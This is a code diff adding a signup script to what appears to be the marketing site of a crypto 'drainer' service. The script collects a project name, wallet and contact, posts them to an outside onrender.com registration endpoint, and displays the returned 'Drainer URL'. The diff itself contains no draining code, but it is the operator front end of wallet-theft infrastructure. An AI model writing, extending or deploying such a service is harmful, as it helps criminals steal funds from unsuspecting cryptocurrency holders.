@@ -337,3 +337,57 @@ export function generateMarketingSite() {
                 </div>
                 
                 <button type="submit" class="btn btn-primary" style="width: 100%;">
+            
+            console.log("Form found, adding event listener...");
+            
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                console.log('Form submitted!');
+                
+                // Get form elements by index (most reliable approach)
+                const inputs = this.getElementsByTagName('input');
+                const selects = this.getElementsByTagName('select');
+                
+                console.log('Inputs count:', inputs.length, 'Selects count:', selects.length);
+                
+                // Simple validation
+                if (inputs.length < 2) {
+                    alert('Form elements not found properly');
+                    return;
+                }
+                
+                const formData = {
+                    projectName: inputs[0].value,
+                    wallet: inputs[1].value,
+                    contact: inputs[2] ? inputs[2].value : '',
+                    themeColor: selects[0] ? selects[0].value : '#6366f1'
+                };
+                
+                console.log('Form data:', formData);
+
+                try {
+                    const response = await fetch('https://service-s816.onrender.com/saas/v2/register', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(formData)
+                    });
+
+                    const result = await response.json();
+                    console.log('API Response:', result);
+                    
+                    if (result.success) {
+                        alert('✅ Success! Your Drainer URL: ' + result.drainerUrl);
+                    } else {
+                        alert('❌ Error: ' + result.error);
+                    }
+                } catch (error) {
+                    console.error('Request failed:', error);
+                    alert('❌ Network error: ' + error.message);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
